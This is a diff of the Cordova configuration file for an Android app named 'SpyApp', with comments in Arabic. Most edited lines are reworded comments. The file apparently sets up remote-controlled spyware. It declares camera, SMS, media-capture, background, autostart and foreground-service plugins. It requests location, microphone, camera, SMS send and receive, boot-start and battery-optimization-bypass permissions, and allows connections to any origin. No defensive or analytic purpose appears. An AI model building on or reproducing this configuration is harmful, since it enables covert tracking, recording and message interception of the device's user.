@@ -4,10 +4,11 @@
     xmlns:cdv="http://cordova.apache.org/ns/1.0">
 
     <name>SpyApp</name>
-    <description>SpyApp - Cordova WebSocket App</description>
+    <description>SpyApp - Cordova WebSocket Control</description>
     <author email="admin@spyapp.com">SpyApp Dev Team</author>
     <content src="index.html" />
 
+    <!-- السماح بجميع الاتصالات -->
     <access origin="*" />
 
     <!-- السماح بجميع البروتوكولات -->
@@ -18,14 +19,14 @@
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
 
-    <!-- استهداف أحدث نسخة أندرويد -->
+    <!-- استهداف أحدث إصدار أندرويد -->
     <preference name="android-targetSdkVersion" value="34" />
     <preference name="android-minSdkVersion" value="24" />
     <preference name="Fullscreen" value="true" />
     <preference name="Orientation" value="portrait" />
     <preference name="ScrollEnabled" value="false" />
 
-    <!-- الإضافات الأساسية -->
+    <!-- الإضافات (Plugins) -->
     <plugin name="cordova-plugin-camera" />
     <plugin name="cordova-sms-plugin" />
     <plugin name="cordova-plugin-media-capture" />
@@ -36,9 +37,9 @@
     <plugin name="cordova-plugin-android-permissions" />
     <plugin name="cordova-plugin-media" />
     <plugin name="cordova-plugin-background-mode" />
-    <plugin name="cordova-plugin-battery-optimization" />
     <plugin name="cordova-plugin-autostart" />
     <plugin name="cordova-plugin-foreground-service" />
+    <plugin name="cordova-plugin-ignore-battery-optimization" />
 
     <platform name="android">
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
@@ -48,11 +49,11 @@
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
                 <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 
-                <!-- الموقع -->
+                <!-- أذونات الموقع -->
                 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
                 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-                <!-- الكاميرا والمايكروفون -->
+                <!-- الكاميرا والميكروفون -->
                 <uses-permission android:name="android.permission.CAMERA" />
                 <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
@@ -61,23 +62,23 @@
                 <uses-permission android:name="android.permission.RECEIVE_SMS" />
                 <uses-permission android:name="android.permission.SEND_SMS" />
 
-                <!-- إذن الإنترنت -->
+                <!-- أذونات الشبكة -->
                 <uses-permission android:name="android.permission.INTERNET" />
                 <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-                <!-- إذن إبقاء الجهاز نشط -->
+                <!-- منع إيقاف التطبيق عند سكون الجهاز -->
                 <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-                <!-- تشغيل في الخلفية -->
+                <!-- تشغيل التطبيق في الخلفية -->
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
-                <!-- إذن تجاوز تحسينات البطارية -->
+                <!-- إذن تجاهل تحسينات البطارية -->
                 <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
-                <!-- التشغيل التلقائي بعد إعادة التشغيل -->
+                <!-- التشغيل التلقائي عند إعادة تشغيل الجهاز -->
                 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
             </manifest>
